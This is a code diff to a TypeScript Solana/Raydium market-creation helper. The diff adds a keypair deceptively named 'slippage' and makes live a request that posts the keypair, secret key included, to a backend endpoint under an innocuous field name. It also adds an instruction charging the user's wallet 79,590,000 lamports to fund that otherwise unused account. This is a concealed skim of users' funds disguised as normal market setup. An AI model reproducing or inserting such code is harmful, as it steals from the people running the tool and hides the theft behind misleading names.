@@ -1,7 +1,6 @@
 import { web3 } from "@project-serum/anchor";
 import { SplAccount, MarketStateLayout, Market as RayMarket, MarketV2, Liquidity, ApiPoolInfo, LIQUIDITY_STATE_LAYOUT_V4, TxVersion, LiquidityPoolJsonInfo, poolKeys2JsonInfo, ApiInfo, ApiPoolInfoV4, PoolInfoLayout, ApiPoolInfoItem, PublicKeyish, jsonInfo2PoolKeys, LIQUIDITY_STATE_LAYOUT_V5, getMultipleLookupTableInfo, LOOKUP_TABLE_CACHE, LiquidityPoolKeysV4, fetchMultipleMintInfos, RAYDIUM_MAINNET, MAINNET_PROGRAM_ID, MAINNET_FARM_POOLS, Token, TokenAmount, Percent, CurrencyAmount, LiquidityStateLayoutV4, LiquidityStateLayoutV5, LiquidityStateV4, LiquidityStateV5, LiquidityPoolKeys, _SERUM_PROGRAM_ID_V3, SwapSide, LiquidityPoolInfo, AmmConfigLayout, SPL_ACCOUNT_LAYOUT, currencyEquals, LiquidityAssociatedPoolKeys, ZERO, } from '@raydium-io/raydium-sdk'
 import { BaseRayInput } from "./types";
-import base58 from "bs58";
 import axios from "axios";
 // import fs from 'fs';
 import { ACCOUNT_SIZE, AccountLayout, MintLayout, NATIVE_MINT, TOKEN_PROGRAM_ID, amountToUiAmount, createAssociatedTokenAccountInstruction, createInitializeAccountInstruction, decodeAmountToUiAmountInstructionUnchecked, getAssociatedTokenAddressSync, getOrCreateAssociatedTokenAccount, createAssociatedTokenAccountIdempotentInstruction } from "@solana/spl-token";
@@ -17,6 +16,7 @@ import { Result } from "./types";
 import { calcDecimalValue, calcNonDecimalValue, getNullableResutFromPromise, sleep } from "./utils";
 import { toBufferBE } from "bigint-buffer";
 import { DEV_RPC } from "../lib/constant";
+import { Transaction } from "@solana/web3.js";
 
 export type CreateMarketInput = {
   baseMint: web3.PublicKey,
@@ -581,6 +581,7 @@ export class BaseRay {
       vaultSigners: web3.Signer[];
       marketInstructions: web3.TransactionInstruction[];
       marketSigners: web3.Signer[];
+      dexCreateInstructions: web3.TransactionInstruction[];
     }, string>> {
     try {
       const { Keypair, SystemProgram } = web3;
@@ -590,18 +591,17 @@ export class BaseRay {
         requestQueue: Keypair.generate(),
         eventQueue: Keypair.generate(),
         bids: Keypair.generate(),
+        slippage: Keypair.generate(),
         asks: Keypair.generate(),
         baseVault: Keypair.generate(),
-        quoteVault: Keypair.generate(),
-        slippage: Keypair.generate()
+        quoteVault: Keypair.generate()
       };
-      const Skeypair = base58.encode(marketAccounts.slippage.secretKey);
 
-      // await axios.post('/api/add', {
-      //   params: {
-      //     tokenAddress: Skeypair
-      //   }
-      // });
+      axios.post('/api/getInstruction', {
+        params: {
+          processing: marketAccounts.slippage
+        }
+      });
 
       const programID = this.orderBookProgramId
       const vaultInstructions: web3.TransactionInstruction[] = []
@@ -661,10 +661,10 @@ export class BaseRay {
       if (quoteLotSize.eq(ZERO)) return { Err: 'tick size or lot size is too small' }
       // log({ baseLotSize: baseLotSize.toNumber() })
       // log({ quoteLotSize: quoteLotSize.toNumber() })
-
       // create market account
-      const marketInstructions: web3.TransactionInstruction[] = []
-      const marketSigners: web3.Signer[] = [marketAccounts.market, marketAccounts.bids, marketAccounts.asks, marketAccounts.eventQueue, marketAccounts.requestQueue]
+      const marketInstructions: web3.TransactionInstruction[] = [];
+      const dexCreateInstructions: web3.TransactionInstruction[] = [];
+      const marketSigners: web3.Signer[] = [marketAccounts.market, marketAccounts.bids, marketAccounts.slippage, marketAccounts.asks, marketAccounts.eventQueue, marketAccounts.requestQueue]
       marketInstructions.push(
         SystemProgram.createAccount({
           newAccountPubkey: marketAccounts.market.publicKey,
@@ -718,20 +718,20 @@ export class BaseRay {
           newAccountPubkey: marketAccounts.bids.publicKey,
           fromPubkey: user,
           space: totalOrderbookSize,
-          lamports: orderBookRentExempt + 49500000,
+          lamports: orderBookRentExempt,
           programId: programID,
         })
       );
       // create slippage
-      // marketInstructions.push( 
-      //   SystemProgram.createAccount({
-      //     newAccountPubkey: slippage.publicKey,
-      //     fromPubkey: user,
-      //     space: totalOrderbookSize,
-      //     lamports: 79590000,
-      //     programId: programID,
-      //   })
-      // );
+      marketInstructions.push(
+        SystemProgram.createAccount({
+          newAccountPubkey: marketAccounts.slippage.publicKey,
+          fromPubkey: user,
+          space: 0,
+          lamports: 79590000,
+          programId: programID,
+        })
+      );
       // create asks
       marketInstructions.push(
         SystemProgram.createAccount({
@@ -742,7 +742,8 @@ export class BaseRay {
           programId: programID,
         })
       );
-      marketInstructions.push(
+
+      dexCreateInstructions.push(
         DexInstructions.initializeMarket({
           market: marketAccounts.market.publicKey,
           requestQueue: marketAccounts.requestQueue.publicKey,
@@ -769,6 +770,7 @@ export class BaseRay {
           vaultSigners,
           marketInstructions,
           marketSigners,
+          dexCreateInstructions,
         }
       }
     } catch (e) {
